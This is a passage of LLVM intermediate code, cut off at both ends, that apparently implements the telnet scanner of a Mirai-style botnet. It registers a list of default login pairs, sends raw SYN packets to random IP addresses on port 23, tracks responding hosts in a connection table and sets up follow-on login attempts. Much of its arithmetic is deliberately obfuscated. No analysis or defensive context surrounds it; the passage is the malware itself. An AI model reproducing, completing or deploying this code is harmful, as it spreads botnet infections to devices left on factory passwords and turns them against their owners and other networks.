  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i16 zeroext 13)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 6)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 3)
  br label %197

; <label>:197:                                    ; preds = %1097, %112
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %198 = load i32, i32* @fake_time, align 4
  %199 = load i32, i32* %10, align 4
  %200 = icmp ne i32 %198, %199
  br i1 %200, label %201, label %269

; <label>:201:                                    ; preds = %197
  %202 = load i32, i32* @fake_time, align 4
  store i32 %202, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %203

; <label>:203:                                    ; preds = %261, %201
  %204 = load i32, i32* %1, align 4
  %205 = icmp slt i32 %204, 384
  br i1 %205, label %206, label %268

; <label>:206:                                    ; preds = %203
  %207 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %207, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %208 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i64 1
  %210 = bitcast %struct.iphdr* %209 to %struct.tcphdr*
  store %struct.tcphdr* %210, %struct.tcphdr** %16, align 8
  %211 = call i32 @rand_next()
  %212 = trunc i32 %211 to i16
  %213 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %214 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %213, i32 0, i32 3
  store i16 %212, i16* %214, align 4
  %215 = load i32, i32* @LOCAL_ADDR, align 4
  %216 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 8
  store i32 %215, i32* %217, align 4
  %218 = call i32 @get_random_ip()
  %219 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %220 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %219, i32 0, i32 9
  store i32 %218, i32* %220, align 4
  %221 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i32 0, i32 7
  store i16 0, i16* %222, align 2
  %223 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %224 = bitcast %struct.iphdr* %223 to i16*
  %225 = call zeroext i16 @checksum_generic(i16* %224, i32 20)
  %226 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 7
  store i16 %225, i16* %227, align 2
  %228 = call zeroext i16 @htons(i16 zeroext 23) #7
  %229 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %230 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %229, i32 0, i32 1
  store i16 %228, i16* %230, align 2
  %231 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 9
  %233 = load i32, i32* %232, align 4
  %234 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 2
  store i32 %233, i32* %235, align 4
  %236 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 6
  store i16 0, i16* %237, align 4
  %238 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %239 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %240 = bitcast %struct.tcphdr* %239 to i8*
  %241 = call zeroext i16 @htons(i16 zeroext 20) #7
  %242 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %238, i8* %240, i16 zeroext %241, i32 20)
  %243 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 6
  store i16 %242, i16* %244, align 4
  %245 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %245, align 4
  %246 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 9
  %248 = load i32, i32* %247, align 4
  %249 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %250 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %249, i32 0, i32 0
  store i32 %248, i32* %250, align 4
  %251 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 1
  %253 = load i16, i16* %252, align 2
  %254 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %253, i16* %254, align 2
  %255 = load i32, i32* @rsck, align 4
  %256 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %257 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %257, %struct.sockaddr** %256, align 8
  %258 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %259 = load %struct.sockaddr*, %struct.sockaddr** %258, align 8
  %260 = call i64 @sendto(i32 %255, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %259, i32 16)
  br label %261

; <label>:261:                                    ; preds = %206
  %262 = load i32, i32* %1, align 4
  %263 = sub i32 0, %262
  %264 = sub i32 0, 1
  %265 = add i32 %263, %264
  %266 = sub i32 0, %265
  %267 = add nsw i32 %262, 1
  store i32 %266, i32* %1, align 4
  br label %203

; <label>:268:                                    ; preds = %203
  br label %269

; <label>:269:                                    ; preds = %268, %197
  store i32 0, i32* %9, align 4
  br label %270

; <label>:270:                                    ; preds = %429, %397, %383, %372, %357, %346, %331, %322, %313, %306, %299, %269
  %271 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %272 = bitcast i8* %271 to %struct.iphdr*
  store %struct.iphdr* %272, %struct.iphdr** %20, align 8
  %273 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %274 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %273, i64 1
  %275 = bitcast %struct.iphdr* %274 to %struct.tcphdr*
  store %struct.tcphdr* %275, %struct.tcphdr** %21, align 8
  %276 = call i32* @__errno_location() #7
  store i32 0, i32* %276, align 4
  %277 = load i32, i32* @rsck, align 4
  %278 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %279 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %279, align 8
  %280 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %281 = load %struct.sockaddr*, %struct.sockaddr** %280, align 8
  %282 = call i64 @recvfrom(i32 %277, i8* %278, i64 1514, i32 16384, %struct.sockaddr* %281, i32* null)
  %283 = trunc i64 %282 to i32
  store i32 %283, i32* %18, align 4
  %284 = load i32, i32* %18, align 4
  %285 = icmp sle i32 %284, 0
  br i1 %285, label %294, label %286

; <label>:286:                                    ; preds = %270
  %287 = call i32* @__errno_location() #7
  %288 = load i32, i32* %287, align 4
  %289 = icmp eq i32 %288, 11
  br i1 %289, label %294, label %290

; <label>:290:                                    ; preds = %286
  %291 = call i32* @__errno_location() #7
  %292 = load i32, i32* %291, align 4
  %293 = icmp eq i32 %292, 11
  br i1 %293, label %294, label %295

; <label>:294:                                    ; preds = %290, %286, %270
  br label %441

; <label>:295:                                    ; preds = %290
  %296 = load i32, i32* %18, align 4
  %297 = sext i32 %296 to i64
  %298 = icmp ult i64 %297, 40
  br i1 %298, label %299, label %300

; <label>:299:                                    ; preds = %295
  br label %270

; <label>:300:                                    ; preds = %295
  %301 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 9
  %303 = load i32, i32* %302, align 4
  %304 = load i32, i32* @LOCAL_ADDR, align 4
  %305 = icmp ne i32 %303, %304
  br i1 %305, label %306, label %307

; <label>:306:                                    ; preds = %300
  br label %270

; <label>:307:                                    ; preds = %300
  %308 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i32 0, i32 6
  %310 = load i8, i8* %309, align 1
  %311 = zext i8 %310 to i32
  %312 = icmp ne i32 %311, 6
  br i1 %312, label %313, label %314

; <label>:313:                                    ; preds = %307
  br label %270

; <label>:314:                                    ; preds = %307
  %315 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %316 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %315, i32 0, i32 0
  %317 = load i16, i16* %316, align 4
  %318 = zext i16 %317 to i32
  %319 = call zeroext i16 @htons(i16 zeroext 23) #7
  %320 = zext i16 %319 to i32
  %321 = icmp ne i32 %318, %320
  br i1 %321, label %322, label %323

; <label>:322:                                    ; preds = %314
  br label %270

; <label>:323:                                    ; preds = %314
  %324 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %325 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %324, i32 0, i32 1
  %326 = load i16, i16* %325, align 2
  %327 = zext i16 %326 to i32
  %328 = load i16, i16* %2, align 2
  %329 = zext i16 %328 to i32
  %330 = icmp ne i32 %327, %329
  br i1 %330, label %331, label %332

; <label>:331:                                    ; preds = %323
  br label %270

; <label>:332:                                    ; preds = %323
  %333 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %334 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %333, i32 0, i32 4
  %335 = load i16, i16* %334, align 4
  %336 = lshr i16 %335, 9
  %337 = xor i16 %336, -1
  %338 = xor i16 1, -1
  %339 = xor i16 1660, -1
  %340 = or i16 %337, %338
  %341 = or i16 1660, %339
  %342 = xor i16 %340, -1
  %343 = and i16 %342, %341
  %344 = and i16 %336, 1
  %345 = icmp ne i16 %343, 0
  br i1 %345, label %347, label %346

; <label>:346:                                    ; preds = %332
  br label %270

; <label>:347:                                    ; preds = %332
  %348 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %349 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %348, i32 0, i32 4
  %350 = load i16, i16* %349, align 4
  %351 = lshr i16 %350, 12
  %352 = xor i16 1, -1
  %353 = xor i16 %351, %352
  %354 = and i16 %353, %351
  %355 = and i16 %351, 1
  %356 = icmp ne i16 %354, 0
  br i1 %356, label %358, label %357

; <label>:357:                                    ; preds = %347
  br label %270

; <label>:358:                                    ; preds = %347
  %359 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %360 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %359, i32 0, i32 4
  %361 = load i16, i16* %360, align 4
  %362 = lshr i16 %361, 10
  %363 = xor i16 %362, -1
  %364 = xor i16 1, -1
  %365 = xor i16 11777, -1
  %366 = or i16 %363, %364
  %367 = or i16 11777, %365
  %368 = xor i16 %366, -1
  %369 = and i16 %368, %367
  %370 = and i16 %362, 1
  %371 = icmp ne i16 %369, 0
  br i1 %371, label %372, label %373

; <label>:372:                                    ; preds = %358
  br label %270

; <label>:373:                                    ; preds = %358
  %374 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %375 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %374, i32 0, i32 4
  %376 = load i16, i16* %375, align 4
  %377 = lshr i16 %376, 8
  %378 = xor i16 1, -1
  %379 = xor i16 %377, %378
  %380 = and i16 %379, %377
  %381 = and i16 %377, 1
  %382 = icmp ne i16 %380, 0
  br i1 %382, label %383, label %384

; <label>:383:                                    ; preds = %373
  br label %270

; <label>:384:                                    ; preds = %373
  %385 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %386 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %385, i32 0, i32 3
  %387 = load i32, i32* %386, align 4
  %388 = call i32 @ntohl(i32 %387) #7
  %389 = sub i32 0, 1
  %390 = add i32 %388, %389
  %391 = sub i32 %388, 1
  %392 = call i32 @htonl(i32 %390) #7
  %393 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %394 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %393, i32 0, i32 8
  %395 = load i32, i32* %394, align 4
  %396 = icmp ne i32 %392, %395
  br i1 %396, label %397, label %398

; <label>:397:                                    ; preds = %384
  br label %270

; <label>:398:                                    ; preds = %384
  store %struct.scanner_connection* null, %struct.scanner_connection** %22, align 8
  %399 = load i32, i32* %9, align 4
  store i32 %399, i32* %18, align 4
  br label %400

; <label>:400:                                    ; preds = %418, %398
  %401 = load i32, i32* %18, align 4
  %402 = icmp slt i32 %401, 256
  br i1 %402, label %403, label %425

; <label>:403:                                    ; preds = %400
  %404 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %405 = load i32, i32* %18, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %404, i64 %406
  %408 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %407, i32 0, i32 3
  %409 = load i32, i32* %408, align 8
  %410 = icmp eq i32 %409, 0
  br i1 %410, label %411, label %417

; <label>:411:                                    ; preds = %403
  %412 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %413 = load i32, i32* %18, align 4
  %414 = sext i32 %413 to i64
  %415 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %412, i64 %414
  store %struct.scanner_connection* %415, %struct.scanner_connection** %22, align 8
  %416 = load i32, i32* %18, align 4
  store i32 %416, i32* %9, align 4
  br label %425

; <label>:417:                                    ; preds = %403
  br label %418

; <label>:418:                                    ; preds = %417
  %419 = load i32, i32* %18, align 4
  %420 = sub i32 0, %419
  %421 = sub i32 0, 1
  %422 = add i32 %420, %421
  %423 = sub i32 0, %422
  %424 = add nsw i32 %419, 1
  store i32 %423, i32* %18, align 4
  br label %400

; <label>:425:                                    ; preds = %411, %400
  %426 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %427 = icmp eq %struct.scanner_connection* %426, null
  br i1 %427, label %428, label %429

; <label>:428:                                    ; preds = %425
  br label %441

; <label>:429:                                    ; preds = %425
  %430 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %431 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %430, i32 0, i32 8
  %432 = load i32, i32* %431, align 4
  %433 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %434 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %433, i32 0, i32 4
  store i32 %432, i32* %434, align 4
  %435 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %436 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %435, i32 0, i32 0
  %437 = load i16, i16* %436, align 4
  %438 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %439 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %438, i32 0, i32 5
  store i16 %437, i16* %439, align 8
  %440 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  call void @setup_connection(%struct.scanner_connection* %440)
  br label %270

; <label>:441:                                    ; preds = %428, %294
  br label %442

; <label>:442:                                    ; preds = %441
  %443 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %5, i32 0, i32 0
  %444 = getelementptr inbounds [16 x i64], [16 x i64]* %443, i64 0, i64 0
  %445 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %444) #6, !srcloc !1
  %446 = extractvalue { i64, i64* } %445, 0
  %447 = extractvalue { i64, i64* } %445, 1
  %448 = trunc i64 %446 to i32
  store i32 %448, i32* %24, align 4
  %449 = ptrtoint i64* %447 to i64
  %450 = trunc i64 %449 to i32
  store i32 %450, i32* %25, align 4
  br label %451

; <label>:451:                                    ; preds = %442
  br label %452

; <label>:452:                                    ; preds = %451
  %453 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %6, i32 0, i32 0
  %454 = getelementptr inbounds [16 x i64], [16 x i64]* %453, i64 0, i64 0
  %455 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %454) #6, !srcloc !2
  %456 = extractvalue { i64, i64* } %455, 0
  %457 = extractvalue { i64, i64* } %455, 1
  %458 = trunc i64 %456 to i32
  store i32 %458, i32* %26, align 4
  %459 = ptrtoint i64* %457 to i64
  %460 = trunc i64 %459 to i32
  store i32 %460, i32* %27, align 4
  br label %461

; <label>:461:                                    ; preds = %452
  store i32 0, i32* %1, align 4
  br label %462

; <label>:462:                                    ; preds = %617, %461
  %463 = load i32, i32* %1, align 4
  %464 = icmp slt i32 %463, 256
  br i1 %464, label %465, label %623

; <label>:465:                                    ; preds = %462
  %466 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %467 = load i32, i32* %1, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %466, i64 %468
  store %struct.scanner_connection* %469, %struct.scanner_connection** %7, align 8
  %470 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %471 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %470, i32 0, i32 3
  %472 = load i32, i32* %471, align 8
  %473 = icmp ugt i32 %472, 1
  %474 = select i1 %473, i32 30, i32 5
  store i32 %474, i32* %28, align 4
  %475 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %476 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %475, i32 0, i32 3
  %477 = load i32, i32* %476, align 8
  %478 = icmp ne i32 %477, 0
  br i1 %478, label %479, label %523

; <label>:479:                                    ; preds = %465
  %480 = load i32, i32* @fake_time, align 4
  %481 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %482 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %481, i32 0, i32 2
  %483 = load i32, i32* %482, align 4
  %484 = sub i32 0, %483
  %485 = add i32 %480, %484
  %486 = sub i32 %480, %483
  %487 = load i32, i32* %28, align 4
  %488 = icmp ugt i32 %485, %487
  br i1 %488, label %489, label %523

; <label>:489:                                    ; preds = %479
  %490 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %491 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %490, i32 0, i32 1
  %492 = load i32, i32* %491, align 8
  %493 = call i32 @close(i32 %492)
  %494 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %495 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %494, i32 0, i32 1
  store i32 -1, i32* %495, align 8
  %496 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %497 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %496, i32 0, i32 3
  %498 = load i32, i32* %497, align 8
  %499 = icmp ugt i32 %498, 2
  br i1 %499, label %500, label %517

; <label>:500:                                    ; preds = %489
  %501 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %502 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %501, i32 0, i32 8
  %503 = load i8, i8* %502, align 8
  %504 = sub i8 0, 1
  %505 = sub i8 %503, %504
  %506 = add i8 %503, 1
  store i8 %505, i8* %502, align 8
  %507 = zext i8 %505 to i32
  %508 = icmp eq i32 %507, 10
  br i1 %508, label %509, label %514

; <label>:509:                                    ; preds = %500
  %510 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %511 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %510, i32 0, i32 8
  store i8 0, i8* %511, align 8
  %512 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %513 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %512, i32 0, i32 3
  store i32 0, i32* %513, align 8
  br label %516

; <label>:514:                                    ; preds = %500
  %515 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %515)
  br label %516

; <label>:516:                                    ; preds = %514, %509
  br label %522

; <label>:517:                                    ; preds = %489
  %518 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %519 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %518, i32 0, i32 8
  store i8 0, i8* %519, align 8
  %520 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %521 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %520, i32 0, i32 3
  store i32 0, i32* %521, align 8
  br label %522

; <label>:522:                                    ; preds = %517, %516
  br label %617

; <label>:523:                                    ; preds = %479, %465
  %524 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %525 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %524, i32 0, i32 3
  %526 = load i32, i32* %525, align 8
  %527 = icmp eq i32 %526, 1
  br i1 %527, label %528, label %569

; <label>:528:                                    ; preds = %523
  %529 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %530 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %529, i32 0, i32 1
  %531 = load i32, i32* %530, align 8
  %532 = srem i32 %531, 64
  %533 = zext i32 %532 to i64
  %534 = shl i64 1, %533
  %535 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %6, i32 0, i32 0
  %536 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %537 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %536, i32 0, i32 1
  %538 = load i32, i32* %537, align 8
  %539 = sdiv i32 %538, 64
  %540 = sext i32 %539 to i64
  %541 = getelementptr inbounds [16 x i64], [16 x i64]* %535, i64 0, i64 %540
  %542 = load i64, i64* %541, align 8
  %543 = xor i64 %542, -1
  %544 = xor i64 %534, -1
  %545 = xor i64 4677166851547606915, -1
  %546 = and i64 %543, 4677166851547606915
  %547 = and i64 %542, %545
  %548 = and i64 %544, 4677166851547606915
  %549 = and i64 %534, %545
  %550 = or i64 %546, %547
  %551 = or i64 %548, %549
  %552 = xor i64 %550, %551
  %553 = or i64 %543, %544
  %554 = xor i64 %553, -1
  %555 = or i64 4677166851547606915, %545
  %556 = and i64 %554, %555
  %557 = or i64 %552, %556
  %558 = or i64 %542, %534
  store i64 %557, i64* %541, align 8
  %559 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %560 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %559, i32 0, i32 1
  %561 = load i32, i32* %560, align 8
  %562 = load i32, i32* %12, align 4
  %563 = icmp sgt i32 %561, %562
  br i1 %563, label %564, label %568

; <label>:564:                                    ; preds = %528
  %565 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %566 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %565, i32 0, i32 1
  %567 = load i32, i32* %566, align 8
  store i32 %567, i32* %12, align 4
  br label %568

; <label>:568:                                    ; preds = %564, %528
  br label %616

; <label>:569:                                    ; preds = %523
  %570 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %571 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %570, i32 0, i32 3
  %572 = load i32, i32* %571, align 8
  %573 = icmp ne i32 %572, 0
  br i1 %573, label %574, label %615

; <label>:574:                                    ; preds = %569
  %575 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %576 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %575, i32 0, i32 1
  %577 = load i32, i32* %576, align 8
  %578 = srem i32 %577, 64
  %579 = zext i32 %578 to i64
  %580 = shl i64 1, %579
  %581 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %5, i32 0, i32 0
  %582 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %583 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %582, i32 0, i32 1
  %584 = load i32, i32* %583, align 8
  %585 = sdiv i32 %584, 64
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds [16 x i64], [16 x i64]* %581, i64 0, i64 %586
  %588 = load i64, i64* %587, align 8
  %589 = xor i64 %588, -1
  %590 = xor i64 %580, -1
  %591 = xor i64 2173979992359175470, -1
  %592 = and i64 %589, 2173979992359175470
  %593 = and i64 %588, %591
  %594 = and i64 %590, 2173979992359175470
  %595 = and i64 %580, %591
  %596 = or i64 %592, %593
  %597 = or i64 %594, %595
  %598 = xor i64 %596, %597
  %599 = or i64 %589, %590
  %600 = xor i64 %599, -1
  %601 = or i64 2173979992359175470, %591
  %602 = and i64 %600, %601
  %603 = or i64 %598, %602
  %604 = or i64 %588, %580
  store i64 %603, i64* %587, align 8
  %605 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %606 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %605, i32 0, i32 1
  %607 = load i32, i32* %606, align 8
  %608 = load i32, i32* %11, align 4
  %609 = icmp sgt i32 %607, %608
  br i1 %609, label %610, label %614

; <label>:610:                                    ; preds = %574
  %611 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %612 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %611, i32 0, i32 1
  %613 = load i32, i32* %612, align 8
  store i32 %613, i32* %11, align 4
  br label %614

; <label>:614:                                    ; preds = %610, %574
  br label %615

; <label>:615:                                    ; preds = %614, %569
  br label %616

; <label>:616:                                    ; preds = %615, %568
  br label %617

; <label>:617:                                    ; preds = %616, %522
  %618 = load i32, i32* %1, align 4
  %619 = sub i32 %618, -181661195
  %620 = add i32 %619, 1
  %621 = add i32 %620, -181661195
  %622 = add nsw i32 %618, 1
  store i32 %621, i32* %1, align 4
  br label %462

; <label>:623:                                    ; preds = %462
  %624 = getelementptr inbounds %struct.timeval.27, %struct.timeval.27* %8, i32 0, i32 1
  store i64 0, i64* %624, align 8
  %625 = getelementptr inbounds %struct.timeval.27, %struct.timeval.27* %8, i32 0, i32 0
  store i64 1, i64* %625, align 8
  %626 = load i32, i32* %12, align 4
  %627 = load i32, i32* %11, align 4
  %628 = icmp sgt i32 %626, %627
  br i1 %628, label %629, label %631

; <label>:629:                                    ; preds = %623
  %630 = load i32, i32* %12, align 4
  br label %633

; <label>:631:                                    ; preds = %623
  %632 = load i32, i32* %11, align 4
  br label %633

; <label>:633:                                    ; preds = %631, %629
  %634 = phi i32 [ %630, %629 ], [ %632, %631 ]
  %635 = add i32 1, 719440286
  %636 = add i32 %635, %634
  %637 = sub i32 %636, 719440286
  %638 = add nsw i32 1, %634
  %639 = call i32 @select(i32 %637, %struct.fd_set.26* %5, %struct.fd_set.26* %6, %struct.fd_set.26* null, %struct.timeval.27* %8)
  store i32 %639, i32* %13, align 4
  %640 = call i64 @time(i64* null) #6
  %641 = trunc i64 %640 to i32
  store i32 %641, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %642

; <label>:642:                                    ; preds = %1090, %633
  %643 = load i32, i32* %1, align 4
  %644 = icmp slt i32 %643, 256
  br i1 %644, label %645, label %1097

; <label>:645:                                    ; preds = %642
  %646 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %647 = load i32, i32* %1, align 4
  %648 = sext i32 %647 to i64
  %649 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %646, i64 %648
  store %struct.scanner_connection* %649, %struct.scanner_connection** %7, align 8
  %650 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %651 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %650, i32 0, i32 1
  %652 = load i32, i32* %651, align 8
  %653 = icmp eq i32 %652, -1
  br i1 %653, label %654, label %655

; <label>:654:                                    ; preds = %645
  br label %1090

; <label>:655:                                    ; preds = %645
  %656 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %6, i32 0, i32 0
  %657 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %658 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %657, i32 0, i32 1
  %659 = load i32, i32* %658, align 8
  %660 = sdiv i32 %659, 64
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds [16 x i64], [16 x i64]* %656, i64 0, i64 %661
  %663 = load i64, i64* %662, align 8
  %664 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
